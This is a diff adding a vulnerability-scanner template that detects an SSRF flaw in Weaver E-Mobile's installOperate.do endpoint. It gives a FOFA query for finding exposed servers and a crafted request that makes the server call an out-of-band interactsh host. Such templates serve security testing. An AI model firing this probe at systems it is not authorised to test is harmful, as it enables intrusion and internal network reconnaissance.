@@ -1,0 +1,29 @@
+id: Weaver-E-Mobile-installOperate-ssrf
+info:
+  name: "泛微E-Mobile installOperate.do接口SSRF漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa：header="EMobileServer"
+    泛微E-Mobile系统installOperate.do接口存在SSRF安全缺陷，攻击者可通过构造恶意请求触发服务端发起任意HTTP请求，实现内网服务探测、端口扫描及敏感信息获取。该漏洞允许未经授权的远程用户访问本地网络资源，可能导致网络拓扑泄露、内部服务指纹识别及后续横向渗透攻击。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140707041
+  tags: 泛微E-Mobile
+
+http:
+- raw:
+  - |
+    GET /install/installOperate.do?svrurl=http://{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
+
+
